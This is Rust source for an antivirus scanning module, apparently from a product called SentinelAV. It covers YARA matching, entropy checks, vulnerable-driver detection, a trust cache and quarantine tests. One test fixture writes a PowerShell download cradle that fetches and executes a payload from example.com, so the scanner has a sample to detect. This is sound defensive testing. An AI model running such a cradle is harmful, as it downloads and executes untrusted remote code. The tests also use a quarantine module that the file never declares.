pub mod bloom;
pub mod browser_shield;
pub mod byovd;
pub mod entropy;
pub mod exclusions;
pub mod game_mode;
pub mod hasher;
pub mod matcher;
pub mod motw;
pub mod process_shield;
pub mod rollback;
pub mod scan_log;
pub mod trust_cache;

use exclusions::Exclusions;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::time::{Instant, UNIX_EPOCH};
use trust_cache::TrustCache;
use walkdir::WalkDir;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    pub path: String,
    pub sha256: String,
    pub matched_rule: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanReport {
    pub files_scanned: usize,
    pub duration_ms: u128,
    pub findings: Vec<ScanResult>,
}

fn get_cache_and_exclusions_paths() -> (PathBuf, PathBuf) {
    if let Ok(local) = std::env::var("LOCALAPPDATA") {
        let base = PathBuf::from(local).join("SentinelAV");
        (base.join("trust_cache.json"), base.join("exclusions.json"))
    } else {
        (PathBuf::from("trust_cache.json"), PathBuf::from("exclusions.json"))
    }
}

/// Walks a directory (or single file), runs compiled YARA rules, and calls `on_file` for every file checked.
pub fn scan_directory_with_progress<F>(
    root: &Path,
    rules_dir: &Path,
    mut on_file: F,
) -> Result<ScanReport, String>
where
    F: FnMut(usize, &Path),
{
    let start = Instant::now();
    let rules = matcher::load_rules(rules_dir)?;
    let mut files_scanned = 0;
    let mut findings = Vec::new();

    if !root.exists() {
        return Err(format!("Target path does not exist: {}", root.display()));
    }

    let (cache_path, exclusions_path) = get_cache_and_exclusions_paths();
    let mut trust_cache = TrustCache::load_from_path(&cache_path);
    let exclusions = Exclusions::load_from_path(&exclusions_path);

    let mut process_file = |path: &Path, scanned: &mut usize, found: &mut Vec<ScanResult>| {
        if exclusions.is_excluded(path, None) {
            return;
        }

        *scanned += 1;
        on_file(*scanned, path);

        let metadata = match std::fs::metadata(path) {
            Ok(m) => m,
            Err(_) => return,
        };
        let mtime_secs = metadata
            .modified()
            .ok()
            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
            .map(|d| d.as_secs())
            .unwrap_or(0);
        let size = metadata.len();

        // Trust cache fast path
        if trust_cache.is_trusted(path, mtime_secs, size) {
            return;
        }

        // YARA rules inspection
        if let Some(rule_name) = matcher::scan_file_with_rules(&rules, path) {
            let hash = hasher::sha256_file(path).unwrap_or_else(|_| "unknown".into());
            found.push(ScanResult {
                path: path.display().to_string(),
                sha256: hash,
                matched_rule: Some(rule_name),
            });
            return;
        }

        // PE / ELF header and Shannon entropy inspection
        if let Ok(analysis) = entropy::analyze_file_header_entropy(path) {
            if analysis.is_suspicious_packed {
                let hash = hasher::sha256_file(path).unwrap_or_else(|_| "unknown".into());
                found.push(ScanResult {
                    path: path.display().to_string(),
                    sha256: hash,
                    matched_rule: Some("Suspicious_High_Entropy_Packed".into()),
                });
                return;
            }
        }

        // Check for BYOVD (vulnerable driver) if .sys file
        if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
            if ext.eq_ignore_ascii_case("sys") {
                let hash = hasher::sha256_file(path).unwrap_or_else(|_| "unknown".into());
                if byovd::is_vulnerable_driver(&hash) {
                    found.push(ScanResult {
                        path: path.display().to_string(),
                        sha256: hash,
                        matched_rule: Some("Vulnerable_BYOVD_LOLDriver".into()),
                    });
                    return;
                }
            }
        }

        // File is clean: update trust cache
        trust_cache.insert(path, mtime_secs, size, String::new(), true);
    };

    if root.is_file() {
        process_file(root, &mut files_scanned, &mut findings);
    } else {
        for entry in WalkDir::new(root).into_iter().filter_map(Result::ok) {
            if entry.file_type().is_file() {
                process_file(entry.path(), &mut files_scanned, &mut findings);
            }
        }
    }

    let duration_ms = start.elapsed().as_millis();

    // Persist trust cache & scan log
    let _ = trust_cache.save_to_path(&cache_path);
    let log_path = scan_log::get_default_log_path();
    let _ = scan_log::append_scan_log(
        &log_path,
        &root.display().to_string(),
        files_scanned,
        duration_ms,
        &findings,
    );

    Ok(ScanReport {
        files_scanned,
        duration_ms,
        findings,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_scan_test_lab() {
        let root = PathBuf::from("../../test_lab");
        let rules = PathBuf::from("../../rules");
        if !root.join("suspect.txt").exists() {
            let _ = std::fs::write(root.join("suspect.txt"), "hello SENTINEL-TEST-SIGNATURE world");
        }
        if !root.join("powershell_sample.ps1").exists() {
            let _ = std::fs::write(root.join("powershell_sample.ps1"), "# Test sample cradle\nIEX (New-Object Net.WebClient).DownloadString('http://example.com/payload')");
        }
        let report = scan_directory_with_progress(&root, &rules, |_count, _path| {})
            .expect("Scan failed");

        assert!(report.files_scanned >= 2);
        assert!(report.findings.len() >= 2);
        let rules_found: Vec<_> = report.findings.iter().filter_map(|f| f.matched_rule.as_deref()).collect();
        assert!(rules_found.contains(&"Test_Suspicious_Pattern"));
        assert!(rules_found.contains(&"Suspicious_PowerShell_Downloader") || rules_found.contains(&"EICAR_Test_File"));
    }

    #[test]
    fn test_full_scan_quarantine_restore_cycle() {
        let temp_dir = std::env::temp_dir().join(format!("sentinel_test_cycle_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&temp_dir);
        let scan_target = temp_dir.join("target");
        let vault_dir = temp_dir.join("vault");
        std::fs::create_dir_all(&scan_target).unwrap();
        std::fs::create_dir_all(&vault_dir).unwrap();

        let infected_file = scan_target.join("malicious.txt");
        let virus_content = b"TEST INFECTION SENTINEL-TEST-SIGNATURE PAYLOAD";
        std::fs::write(&infected_file, virus_content).unwrap();

        let rules_dir = PathBuf::from("../../rules");
        let report = scan_directory_with_progress(&scan_target, &rules_dir, |_count, _path| {})
            .expect("Scan failed");

        assert_eq!(report.findings.len(), 1);
        let finding = &report.findings[0];
        assert_eq!(finding.matched_rule.as_deref(), Some("Test_Suspicious_Pattern"));

        // Quarantine the infected file
        let entry = quarantine::quarantine_file(
            Path::new(&finding.path),
            &finding.sha256,
            finding.matched_rule.as_deref().unwrap_or(""),
            &vault_dir,
        ).expect("Quarantine failed");

        // Verify original file is gone
        assert!(!infected_file.exists());

        // Restore file
        let restored_path = quarantine::restore_file(&entry.id, &vault_dir)
            .expect("Restore failed");

        // Verify file is back with original content
        assert!(restored_path.exists());
        let restored_content = std::fs::read(&restored_path).unwrap();
        assert_eq!(restored_content, virus_content);

        // Cleanup
        let _ = std::fs::remove_dir_all(&temp_dir);
    }
}
